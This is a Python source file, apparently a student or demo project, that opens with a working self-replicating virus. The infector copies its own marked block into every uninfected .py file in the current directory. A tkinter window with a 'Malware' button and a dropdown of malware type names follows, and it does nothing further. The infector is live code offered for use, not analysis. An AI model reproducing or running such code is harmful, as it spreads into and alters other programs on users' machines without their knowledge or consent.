# Malware attack that is run once the (main.py) program is run

# VIRUS BEGINS HERE #

from tkinter import *
import sys, glob, re

# Get a copy of the virus
vCode = []
fh = open(sys.argv[0], 'r')
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
    if(re.search('^# VIRUS BEGINS HERE', line)): inVirus = True
    if(inVirus): vCode.append(line)
    if(re.search('^# VIRUS ENDS HERE', line)): break

# Find potential victims
progs = glob.glob('*.py')

# Check and infect
for prog in progs:
    fh = open(prog, 'r')
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if('# VIRUS BEGINS HERE' in line):
            infected = True
            break

    if not infected:
        newCode = []
        if('#:' in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        # Writing new virus infected code
        fh = open(prog, 'w')
        fh.writelines(newCode)
        fh.close()

# Optional payload

# VIRUS ENDS HERE #
# Get malware, build functionality to activate malware

from tkinter import *

methods = {"Trojan Horse: ", "Ransomware: ", "Bot", "Worms", "Malware"}

num = freq = 0


def malw():
    c = Tk()
    c.title("Malware")
    mainframe = Frame(c)
    mainframe.grid(column=0, row=0, sticky=(N, W, E, S))
    mainframe.columnconfigure(0, weight=1)
    mainframe.rowconfigure(0, weight=1)
    mainframe.pack(pady=100, padx=100)
    # Drop Down list for Malware

    tkvar = StringVar(c)

    popupMenu = OptionMenu(mainframe, tkvar, *methods)
    Label(mainframe, text="Choose Malware", padx=100).grid(row=1, column=1)
    popupMenu.grid(row=2, column=1, padx=100)

    def change_dropdown(*args):
        print(tkvar.get())

    tkvar.trace('w', change_dropdown)

    c.mainloop()




a = Tk()
b = Button(a, text="Malware", height=1, width=10, command=lambda: malw())
b.pack()
a.mainloop()


malw()
